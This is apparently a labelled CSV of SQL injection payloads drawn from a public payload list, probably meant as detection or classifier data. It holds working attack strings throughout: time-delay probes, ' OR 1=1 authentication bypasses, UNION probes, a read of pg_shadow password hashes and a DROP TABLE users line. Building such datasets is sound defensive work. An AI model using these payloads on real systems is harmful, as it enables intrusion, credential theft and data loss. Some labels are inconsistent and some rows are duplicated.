Payload,Signature,AttackType,Severity,MITRE,Label,Description
""")) waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")) waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))) waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))) waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")))) waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")))) waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))))) waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))))) waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')))))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')))))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")))))) waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")))))) waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
<username>' OR 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'OR '' = '	Allows authentication without a valid username.,CMDi_Unix,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
<username>'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'OR 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)%20waitfor%20delay%20'0:0:20'%20/*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)%20waitfor%20delay%20'0:0:20'%20--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')%20waitfor%20delay%20'0:0:20'%20/*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')%20waitfor%20delay%20'0:0:20'%20--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")%20waitfor%20delay%20'0:0:20'%20/*",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")%20waitfor%20delay%20'0:0:20'%20--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
))%20waitfor%20delay%20'0:0:20'%20/*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
))%20waitfor%20delay%20'0:0:20'%20--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))%20waitfor%20delay%20'0:0:20'%20/*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'))%20waitfor%20delay%20'0:0:20'%20--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))%20waitfor%20delay%20'0:0:20'%20/*",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""))%20waitfor%20delay%20'0:0:20'%20--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select version();	,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_database();,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_user;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select session_user;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('log_connections');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('log_statement');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('port');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('password_encryption');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('krb_server_keyfile');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('virtual_host');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('port');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('config_file');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('hba_file');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current_setting('data_directory');,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from pg_shadow;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from pg_group;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
create table myfile (input TEXT);,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from myfile;copy myfile to /tmp/test;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 ORDER BY SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 ORDER BY SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 ORDER BY SLEEP(5)-- ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 1,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 1#,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 1-- ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT USER()-- ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT SLEEP(5)-- ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT NULL-- ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT NULL#,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT NULL ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC),SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' ORDER BY 1--+,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' ORDER BY 1--+,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' ORDER BY 1--+,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; DROP TABLE users--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION SELECT @@version--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION SELECT @@version--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"' or """,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
-- or #,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR '1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1 -- -,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
